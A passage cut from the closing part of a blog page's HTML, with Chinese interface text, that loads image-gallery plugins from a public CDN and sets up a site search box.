    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>